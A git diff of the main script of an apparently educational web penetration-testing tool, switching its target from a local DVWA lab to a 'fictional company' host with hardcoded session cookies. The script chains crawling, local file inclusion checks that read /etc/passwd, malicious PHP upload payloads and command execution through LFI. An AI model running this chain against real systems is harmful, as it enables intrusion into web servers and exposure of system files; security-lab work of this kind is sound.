@@ -8,17 +8,14 @@ import lfi
 import uploadv2
 
 # Fictional Company
-# URL = "http://ict2214p1b2.mooo.com/"
-# COOKIE = {"PHPSESSID": "t9i6h0t3p3vu491qg86qrsispc"}
-# PAYLOAD_FILENAME = "test.php"
+URL = "http://ict2214p1b2.mooo.com/"
+COOKIE = {"PHPSESSID": "t9i6h0t3p3vu491qg86qrsispc"}
+PAYLOAD_FILENAME = "test.php"
 
 # DVWA
-URL = "http://127.0.0.1/DVWA/"
-COOKIE = {
-    'PHPSESSID': '592650b8ta6dts0u0orun6jj25',
-    'security': 'medium'
-}
-PAYLOAD_FILENAME = "malicious.php"
+# URL = "http://127.0.0.1/DVWA/"
+# COOKIE = {"PHPSESSID": "592650b8ta6dts0u0orun6jj25", "security": "medium"}
+# PAYLOAD_FILENAME = "malicious.php"
 
 # UPLOAD_DIR = f"{URL}hackable/uploads/"
 UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
@@ -59,14 +56,14 @@ def main():
         print("[+] " + url)
     print("\nPotential LFI vulnerabilities:")
     lfi_targets = crawler.check_lfi(found_urls)
-    
+
     lfi_confirmed_targets = set()
     for target in lfi_targets:
         print(target)
         result = lfi.show_passwd(target, COOKIE)
         if result:
             lfi_confirmed_targets.add(target)
-    
+
     # Generate the payloads
     payload_filenames = uploadv2.create_payloads()
 
@@ -92,7 +89,7 @@ def main():
     #     exit(1)
     # direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
     # print(f"[+] Direct file URL (if accessible): {direct_file_url}")
-
+    
     # --- LFI Brute Force Phase ---
     lfi_found_url = None
     for target in lfi_confirmed_targets:
@@ -107,7 +104,7 @@ def main():
     else:
         print("[-] Could not locate the uploaded file via LFI.")
         command_results = ""
-
+        
     # # --- Report Generation ---
     # generate_report(direct_file_url, lfi_found_url, command_results)
 
